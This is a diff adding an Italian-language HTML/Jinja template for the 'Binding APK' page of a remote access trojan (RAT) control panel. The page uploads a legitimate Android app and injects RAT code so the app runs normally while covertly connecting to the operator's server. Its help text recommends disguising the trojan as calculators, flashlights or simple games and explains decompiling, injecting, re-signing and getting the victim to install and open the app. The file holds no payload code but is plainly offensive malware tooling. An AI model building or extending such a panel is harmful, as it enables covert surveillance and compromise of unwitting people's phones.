@@ -1,0 +1,143 @@
+{% extends "base.html" %}
+
+{% block title %}Binding APK - RAT Control Panel{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header bg-primary text-white">
+                <h4 class="mb-0"><i class="bi bi-link-45deg"></i> Binding APK</h4>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h5><i class="bi bi-info-circle"></i> Informazioni sul Binding</h5>
+                    <p>Il binding APK ti permette di iniettare il codice RAT in un'applicazione Android esistente. L'applicazione modificata funzionerà normalmente, ma includerà anche il RAT che si connetterà al server.</p>
+                    <p>Il RAT è configurato per funzionare sia con l'IP locale che con quello pubblico, permettendo la connessione sia sulla stessa rete WiFi che da Internet.</p>
+                </div>
+                
+                {% if error %}
+                <div class="alert alert-danger">
+                    <i class="bi bi-exclamation-triangle"></i> {{ error }}
+                </div>
+                {% endif %}
+                
+                <form method="POST" enctype="multipart/form-data" class="mt-4">
+                    <div class="mb-3">
+                        <label for="apk_file" class="form-label"><i class="bi bi-file-earmark-zip"></i> Seleziona APK</label>
+                        <input type="file" class="form-control" id="apk_file" name="apk_file" accept=".apk" required>
+                        <div class="form-text">Seleziona un file APK da modificare. L'APK originale non verrà modificato.</div>
+                    </div>
+                    
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="local_ip" class="form-label"><i class="bi bi-wifi"></i> IP Locale (Rete WiFi)</label>
+                                <input type="text" class="form-control" id="local_ip" name="local_ip" value="{{ local_ip }}" placeholder="192.168.1.100">
+                                <div class="form-text">IP del server sulla rete locale. Usato quando il dispositivo è sulla stessa rete WiFi.</div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="public_ip" class="form-label"><i class="bi bi-globe"></i> IP Pubblico (Internet)</label>
+                                <input type="text" class="form-control" id="public_ip" name="public_ip" value="{{ public_ip }}" placeholder="your.public.ip">
+                                <div class="form-text">IP pubblico del server. Usato quando il dispositivo è su una rete diversa (es. dati mobili).</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label class="form-label"><i class="bi bi-hdd-network"></i> Porta</label>
+                        <input type="text" class="form-control" value="{{ port }}" disabled>
+                        <div class="form-text">Porta del server. Non può essere modificata.</div>
+                    </div>
+                    
+                    <div class="d-grid gap-2">
+                        <button type="submit" class="btn btn-primary btn-lg">
+                            <i class="bi bi-magic"></i> Crea APK Modificato
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="bi bi-question-circle"></i> Come Funziona</h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="card mb-3">
+                            <div class="card-header bg-light">
+                                <h6 class="mb-0">1. Selezione APK</h6>
+                            </div>
+                            <div class="card-body">
+                                <p>Seleziona un'applicazione Android (.apk) da modificare. L'applicazione dovrebbe essere non protetta e non firmata con una firma avanzata.</p>
+                                <p>Esempi di buone applicazioni da modificare: calcolatrici, torce, giochi semplici, ecc.</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-md-6">
+                        <div class="card mb-3">
+                            <div class="card-header bg-light">
+                                <h6 class="mb-0">2. Configurazione IP</h6>
+                            </div>
+                            <div class="card-body">
+                                <p>Configura gli indirizzi IP a cui il RAT si connetterà:</p>
+                                <ul>
+                                    <li><strong>IP Locale:</strong> Per connessioni sulla stessa rete WiFi</li>
+                                    <li><strong>IP Pubblico:</strong> Per connessioni da Internet/dati mobili</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="card mb-3">
+                            <div class="card-header bg-light">
+                                <h6 class="mb-0">3. Processo di Binding</h6>
+                            </div>
+                            <div class="card-body">
+                                <p>Il server esegue queste operazioni:</p>
+                                <ol>
+                                    <li>Decompila l'APK originale</li>
+                                    <li>Inietta il codice RAT</li>
+                                    <li>Aggiunge i permessi necessari</li>
+                                    <li>Ricompila l'APK</li>
+                                    <li>Firma l'APK con una chiave di debug</li>
+                                </ol>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-md-6">
+                        <div class="card mb-3">
+                            <div class="card-header bg-light">
+                                <h6 class="mb-0">4. Installazione</h6>
+                            </div>
+                            <div class="card-body">
+                                <p>Dopo aver creato l'APK modificato:</p>
+                                <ol>
+                                    <li>Scarica l'APK modificato</li>
+                                    <li>Trasferiscilo sul dispositivo Android</li>
+                                    <li>Installa l'APK (potrebbe essere necessario abilitare "Origini sconosciute")</li>
+                                    <li>Apri l'applicazione per avviare il RAT</li>
+                                </ol>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
